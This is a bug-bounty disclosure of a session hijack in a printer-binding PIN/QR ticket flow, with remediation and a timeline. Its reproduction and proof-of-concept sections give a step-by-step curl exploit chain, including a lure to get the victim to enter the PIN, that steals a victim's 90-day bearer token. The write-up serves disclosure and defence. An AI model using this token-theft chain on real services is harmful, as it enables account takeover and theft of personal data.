---
title: "Unauthenticated Session Hijack via Printer Binding (PIN) Leading to Full Account Takeover"
date: 2026-07-28T00:00:00Z
draft: false
description: "A printer-binding ticket flow didn't bind tickets to a session, letting an unauthenticated attacker steal a victim's auth token through a PIN or QR code, even when the bind failed."
summary: "A printer-binding ticket (PIN/QR) flow bound tickets to no session, so an unauthenticated attacker could recover a victim's full auth token, even when the bind visibly failed."
tags: ["Account Takeover", "Broken Access Control", "Authentication", "API", "CWE-287"]
severity: ["High"]
program: "Private target"
bounty: "$600"
---

## Summary

The ticket mechanism used to bind a printer in a private target's companion mobile app (the `/user/ticket` and `/my/ticket` endpoints) did not bind a ticket to the session that created it, nor to the session that confirmed it.

As a result, an unauthenticated attacker could generate a ticket, present it to a victim as a QR code or PIN, and, after the victim entered it in the add/bind-printer flow, retrieve the victim's full authentication token with a single unauthenticated API call.

Critically, the printer-binding operation did not need to succeed. In testing, the bind failed on the victim's side (the app showed an error and no printer was linked), yet the victim's session was still associated with the ticket, and the attacker still recovered a valid 90-day token. The session-linking side effect of confirmation was not rolled back when the downstream bind failed, which made the attack both reliable and stealthy: the victim saw a failure and reasonably assumed nothing had happened.

## Root Cause

Tickets carried no ownership binding. Any caller could generate a ticket, any authenticated user could confirm any ticket ID, and any caller, including an unauthenticated one, could then retrieve the resulting session token from that ticket.

### Affected component

The QR/PIN ticket flow used by the companion mobile app to connect and bind a printer.

| Method | Endpoint | Auth required | Role in attack |
|--------|----------|---------------|----------------|
| GET | `/v1/user-service/user/ticket` | None | Attacker generates a ticket / PIN |
| GET | `/v1/user-service/my/ticket/{id}` | Any user | Reads any ticket's state (no ownership check) |
| POST | `/v1/user-service/my/ticket/{id}` | Any user | Victim confirms the ticket; links their session |
| POST | `/v1/user-service/user/ticket/{id}` | None | Attacker retrieves the victim's session token |

## Vulnerability Details

The flow is meant to let a user link a device by entering a short PIN (or scanning the equivalent QR code) inside the authenticated mobile app. The design assumes the entity that generates the ticket and the entity that consumes the resulting token are the same. Three independent authorization gaps broke that assumption:

1. **No binding between ticket generation and token retrieval.** `GET /user/ticket` issued a ticket to an anonymous caller, and `POST /user/ticket/{id}` returned the resulting token to any anonymous caller. The token was not tied to the original requester's session, cookie, or IP.
2. **No ownership check on confirmation.** `POST /my/ticket/{id}` accepted an arbitrary attacker-supplied ticket ID. The app would confirm a ticket the victim's device never generated.
3. **Session linkage persisted through a failed bind.** Even when the printer-binding step downstream of confirmation failed, the session had already been attached to the ticket, and that association was not invalidated. The token-issuing endpoint then succeeded regardless.

Because the PIN and QR code encode the same ticket ID, both input paths were exploitable. In testing the PIN path was used, and the issued token's `accessMethod` came back as `pincode`, confirming the PIN entry path produced a full session token.

## Attack Flow

{{< attack-flow attacker="ATTACKER (unauthenticated)" victim="VICTIM (logged into private target)" >}}
@attacker 1. GET /user/ticket
-> ticket / PIN "AP8B4L"  (no auth)

@handoff 2. Present as QR or PIN
"Scan / enter to link your printer"

@victim 3. Enters PIN in Add Printer flow
POST /my/ticket/AP8B4L  (Bearer = victim token)
-> session linked
!! bind FAILS — victim sees an error

@attacker 4. POST /user/ticket/AP8B4L  (no auth header)
-> { accessToken, accessMethod: "pincode", expiresIn: 7776000 (90 days) }

@attacker 5. Use stolen token
-> read PII, KEK, devices; write profile; open support tickets

@takeover FULL ACCOUNT TAKEOVER
{{< /attack-flow >}}

## Steps to Reproduce

**Prerequisites:** the attacker needs no account; the victim must be logged into the app and enter the attacker's PIN (or scan the QR) in the bind-printer flow.

**Step 1 — Attacker generates a ticket (no auth):**

```bash
curl -s https://api.target.example/v1/user-service/user/ticket
```

**Step 2 — Victim enters the PIN in the bind-printer flow (uses the victim's token):**

```bash
curl -s -X POST https://api.target.example/v1/user-service/my/ticket/AP8B4L \
  -H "Authorization: Bearer <VICTIM_TOKEN>" \
  -H "Content-Type: application/json" -d '{}'
# Binding may report an error to the victim — proceed anyway.
```

**Step 3 — Attacker retrieves the victim's token (no auth):**

```bash
curl -s https://api.target.example/v1/user-service/user/ticket/AP8B4L
# -> returns a valid 90-day Bearer token for the victim's session
```

**Step 4 — Confirm the stolen identity:**

```bash
curl -s https://api.target.example/v1/user-service/my/profile \
  -H "Authorization: Bearer <STOLEN_TOKEN>"
# -> {"uid":<redacted>,"account":"<victim_email>", ...}
```

A fully automated proof of concept supported `generate`, `steal <TICKET_ID>`, `impact <TOKEN>`, and an end-to-end auto mode.

## Proof of Concept

The three-call attack as a live run. The bind step fails in the victim's face, yet the attacker still walks away with a valid 90-day token:

{{< terminal-replay path="poc/pin_hijack.sh" >}}
# 1. attacker generates a ticket (no auth)
$ curl -s https://api.target.example/v1/user-service/user/ticket
{"ticket":"AP8B4L","expiresIn":300}

# 2. victim enters the PIN in the bind-printer flow (victim's token)
$ curl -s -X POST https://api.target.example/v1/user-service/my/ticket/AP8B4L -H "Authorization: Bearer <VICTIM_TOKEN>"
{"error":"bind_failed"} # victim sees an error — but the session is already linked

# 3. attacker retrieves the victim's token (no auth)
$ curl -s https://api.target.example/v1/user-service/user/ticket/AP8B4L
{"token":"<redacted-90d-bearer>","accessMethod":"pincode","expiresIn":7776000} # attacker now holds the victim's session
{{< /terminal-replay >}}

## Impact

This vulnerability entirely bypassed the intended authentication mechanism by abusing the hardware connection logic. Because the app threw an error during the exploit, the attack was perfectly stealthy: the victim believed the pairing had simply failed and had no reason to suspect a compromise.

A successful attack yielded a 90-day token with full read/write privileges, allowing the attacker to:

- Exfiltrate extensive personally identifiable information (PII).
- Access device encryption keys (KEK) to decrypt sensitive MQTT traffic.
- Modify the victim's profile (demonstrated by setting the bio to a proof-of-concept marker).
- Read and create official after-sales support tickets under the victim's identity.

If weaponized at scale, it would severely compromise the safeguarding of users' digital assets and physical hardware control.

## Remediation

1. **Bind the ticket to its generating session.** Only the session or device that called `GET /user/ticket` should be able to retrieve the token via `POST /user/ticket/{id}` (for example, a server-side handle, a signed nonce, or device/IP binding).
2. **Validate ownership on confirmation.** `POST /my/ticket/{id}` should only accept tickets generated for the requesting device's own pairing attempt, not arbitrary IDs.
3. **Roll back session linkage on bind failure.** Treat session association and successful printer binding atomically; if binding fails, the ticket must not yield a token.

## Timeline

| Date | Event |
|------|-------|
| 2026-05-31 | Reported to the program |
| 2026-07-28 | Triaged; $600 bounty awarded |

## Bounty

$600.
